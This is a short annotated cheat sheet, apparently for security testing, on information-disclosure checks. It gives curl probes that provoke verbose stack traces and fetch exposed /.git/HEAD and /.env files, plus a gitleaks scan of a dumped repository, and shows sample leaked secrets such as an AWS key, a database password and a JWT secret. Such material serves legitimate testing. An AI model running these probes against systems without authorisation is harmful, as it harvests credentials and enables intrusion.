# Information Disclosure - Annotated Examples

## Verbose Error Trigger
```bash
curl -s -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"email":1234}'
```
Leak signal:
```
java.lang.IllegalArgumentException at com.company.api.UserController...
/srv/app/src/controllers/user.ts:87
```

## Exposed Git Metadata
```bash
curl -i https://target.com/.git/HEAD
```
Leak signal:
```
HTTP/1.1 200 OK
ref: refs/heads/main
```

## Secrets from Dumped Repo
```bash
gitleaks detect --source /workspace/git-dump
```
Sample hit:
```
AWS_SECRET_ACCESS_KEY in config/production.env
```

## Exposed Env File
```bash
curl -s https://target.com/.env
```
Leak signal:
```
DB_PASSWORD=...
JWT_SECRET=...
```
